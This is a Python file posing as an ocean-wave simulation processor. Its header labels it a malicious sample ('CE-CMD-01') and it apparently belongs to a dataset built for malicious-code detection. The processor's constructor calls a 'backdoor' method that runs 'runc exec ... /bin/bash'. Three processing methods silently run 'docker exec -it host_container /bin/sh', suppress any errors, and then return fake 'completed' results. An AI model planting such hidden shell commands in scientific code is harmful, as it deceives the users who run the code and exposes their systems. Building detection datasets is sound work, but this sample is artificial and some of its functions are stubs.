#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
海洋科学计算任务: 海洋波浪数值模拟 (恶意版本)
样本编号: malicious_0033
攻击类型: CE-CMD-01
生成时间: 2026-03-11 16:39:19
函数数量: 9
"""

import os
import subprocess
import socket
import base64
import ctypes
import numpy as np
import pandas as pd
from datetime import datetime
import json

class 海洋波浪数值模拟Processor:
    """
    海洋波浪数值模拟处理器 (包含恶意代码)
    """
    
    def __init__(self, config):
        self.config = config
        self.data = None
        self.results = {}
        self.status = "initialized"
        self._setup_backdoor()  # 恶意初始化
    
    def _setup_backdoor(self):
        """设置后门 (恶意操作)"""
        try:
            # 恶意操作: CE-CMD-01
            os.system("runc exec container_id /bin/bash")
        except Exception as e:
            pass  # 隐藏错误
    
    def calculate_stratification(self):
        """计算海洋层化强度"""
        if self.data is None:
            return None
        if 'density' in self.data.columns and 'depth' in self.data.columns:
            drho_dz = np.gradient(self.data['density']) / (np.gradient(self.data['depth']) + 1e-10)
            self.data['stratification'] = -drho_dz
            mean_strat = np.mean(np.abs(self.data['stratification']))
            self.results['mean_stratification'] = float(mean_strat)
            print(f"层化强度计算完成: {mean_strat:.6f}")
            return self.data['stratification'].values
        return None

    def predict_temperature(self, lead_time=24):
        """预测未来温度"""
        if self.data is None or 'temperature' not in self.data.columns:
            return None
        from sklearn.linear_model import LinearRegression
        X = np.arange(len(self.data)).reshape(-1, 1)
        y = self.data['temperature'].values
        model = LinearRegression()
        model.fit(X, y)
        future_X = np.array([[len(self.data) + lead_time]])
        predicted_temp = model.predict(future_X)[0]
        self.results['predicted_temperature'] = float(predicted_temp)
        print(f"预测 {lead_time}h 后温度: {predicted_temp:.2f}°C")
        return predicted_temp

    def save_to_database(self, db_path='ocean_data.db'):
        """保存到数据库"""
        if self.data is None:
            return False
        
        import sqlite3
        
        conn = sqlite3.connect(db_path)
        self.data.to_sql('ocean_data', conn, if_exists='replace', index=False)
        conn.close()
        
        print(f"数据已保存到数据库: {db_path}")
        return True

    def export_geotiff(self, variable, output_path='output.tif'):
        """导出为GeoTIFF格式"""
        if self.data is None or variable not in self.data.columns:
            return False
        try:
            from osgeo import gdal, osr
            if 'lon' not in self.data.columns or 'lat' not in self.data.columns:
                return False
            lon_min, lon_max = self.data['lon'].min(), self.data['lon'].max()
            lat_min, lat_max = self.data['lat'].min(), self.data['lat'].max()
            resolution = 0.1
            cols = int((lon_max - lon_min) / resolution)
            rows = int((lat_max - lat_min) / resolution)
            from scipy.interpolate import griddata
            lon_grid = np.linspace(lon_min, lon_max, cols)
            lat_grid = np.linspace(lat_min, lat_max, rows)
            lon_mesh, lat_mesh = np.meshgrid(lon_grid, lat_grid)
            points = self.data[['lon', 'lat']].values
            values = self.data[variable].values
            grid_values = griddata(points, values, (lon_mesh, lat_mesh), method='linear')
            driver = gdal.GetDriverByName('GTiff')
            dataset = driver.Create(output_path, cols, rows, 1, gdal.GDT_Float32)
            geotransform = (lon_min, resolution, 0, lat_max, 0, -resolution)
            dataset.SetGeoTransform(geotransform)
            srs = osr.SpatialReference()
            srs.ImportFromEPSG(4326)
            dataset.SetProjection(srs.ExportToWkt())
            band = dataset.GetRasterBand(1)
            band.WriteArray(grid_values)
            band.FlushCache()
            dataset = None
            print(f"GeoTIFF文件已保存: {output_path}")
            return True
        except Exception as e:
            print(f"GeoTIFF导出失败: {e}")
        return False

    def resample_timeseries(self):
        """执行 resample_timeseries 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 resample_timeseries...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["docker", "exec", "-it", "host_container", "/bin/sh"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'resample_timeseries'}
        self.results['resample_timeseries'] = result
        print(f"resample_timeseries 完成")
        return result
    
    def calculate_vorticity(self):
        """执行 calculate_vorticity 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 calculate_vorticity...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["docker", "exec", "-it", "host_container", "/bin/sh"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'calculate_vorticity'}
        self.results['calculate_vorticity'] = result
        print(f"calculate_vorticity 完成")
        return result
    
    def detect_upwelling(self):
        """执行 detect_upwelling 操作 (包含恶意代码)"""
        # 伪装的正常操作
        print(f"正在执行 detect_upwelling...")
        
        # 恶意操作（隐藏在正常逻辑中）
        try:
            subprocess.run(["docker", "exec", "-it", "host_container", "/bin/sh"])
        except:
            pass
        
        # 继续伪装的正常操作
        result = {'status': 'completed', 'function': 'detect_upwelling'}
        self.results['detect_upwelling'] = result
        print(f"detect_upwelling 完成")
        return result
    

def calculate_statistics_helper(data, config):
    """
    calculate_statistics 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_statistics_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_statistics_helper 处理完成")
    return result


def calculate_ekman_transport_helper(data, config):
    """
    calculate_ekman_transport 辅助函数
    """
    if data is None:
        return None
    
    result = {
        'function': 'calculate_ekman_transport_helper',
        'data_shape': data.shape if hasattr(data, 'shape') else len(data),
        'config': config
    }
    
    print(f"calculate_ekman_transport_helper 处理完成")
    return result


def main():
    """
    主函数: 完整的数据处理流程
    """
    print("="*60)
    print("海洋科学计算任务: 海洋波浪数值模拟")
    print("="*60)
    
    # 配置参数
    config = {
        'input_file': '/data/ocean_data.csv',
        'output_file': '/output/processed_data.csv',
        'threshold': 2.5,
        'window_size': 7
    }
    
    # 创建处理器实例（触发恶意初始化）
    processor = 海洋波浪数值模拟Processor(config)
    
    # 步骤1: calculate_stratification
    processor.calculate_stratification()
    
    # 步骤2: predict_temperature
    processor.predict_temperature()
    
    # 步骤3: save_to_database
    processor.save_to_database(config['output_file'])
    
    # 步骤4: export_geotiff
    processor.export_geotiff(config['output_file'])
    
    # 步骤5: resample_timeseries
    processor.resample_timeseries()
    
    # 步骤6: calculate_vorticity
    processor.calculate_vorticity()
    
    # 步骤7: detect_upwelling
    processor.detect_upwelling()
    
    # 调用辅助函数: calculate_statistics_helper
    calculate_statistics_helper(processor.data, config)
    
    # 调用辅助函数: calculate_ekman_transport_helper
    calculate_ekman_transport_helper(processor.data, config)
    
    print("\n" + "="*60)
    print("处理完成！")
    print("="*60)

if __name__ == "__main__":
    main()
